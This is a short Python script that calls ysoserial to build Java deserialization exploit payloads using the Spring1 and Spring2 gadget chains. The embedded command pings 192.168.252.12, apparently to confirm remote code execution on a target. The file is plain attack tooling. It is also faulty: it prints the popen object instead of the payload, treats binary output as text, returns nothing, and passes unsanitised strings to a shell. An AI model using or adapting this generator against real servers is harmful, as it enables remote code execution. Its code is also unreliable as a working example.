import os
from urllib.parse import urlencode,quote_plus,quote
from base64 import b64encode,urlsafe_b64encode

def generate(ysoserial_path,cmd):
    payloads = ['Spring1','Spring2']
    for payload in payloads:
        print('Generating ' + payload + '...')
        command = os.popen("java -jar " + ysoserial_path + " " + payload + " " + cmd)
        result = command.read()
        command.close()
        print(command)
        #return urlsafe_b64encode(result.encode())

ysoserial_path = "/usr/share/ysoserial/ysoserial-master-SNAPSHOT.jar"
payload = generate(ysoserial_path, "ping -c 1 192.168.252.12")
print(payload)
